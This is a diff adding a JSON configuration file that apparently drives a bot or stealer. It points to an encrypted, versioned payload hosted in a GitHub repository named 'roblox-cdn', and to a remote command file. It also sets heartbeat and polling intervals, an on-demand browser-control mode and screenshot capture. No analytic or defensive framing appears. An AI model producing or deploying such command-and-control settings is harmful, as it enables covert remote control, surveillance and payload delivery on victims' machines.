@@ -1,0 +1,17 @@
+{
+  "version": "1.0.0",
+  "payload": {
+    "url": "https://raw.githubusercontent.com/lolcaken/roblox-cdn/main/payload.1.0.0.enc",
+    "sha256": "975d19c8ef4772255bc6559cce3bac5b91bf3ee8eb50e9de5904905096ec85f5"
+  },
+  "config": {
+    "botUrl": "https://pegasus.invalid",
+    "cmdUrl": "https://raw.githubusercontent.com/lolcaken/roblox-cdn/main/cmd.enc",
+    "reportUrl": "",
+    "heartbeatMin": 15,
+    "pollWaitSec": 20,
+    "cdpMode": "ondemand",
+    "screenshot": true,
+    "dedup": true
+  }
+}
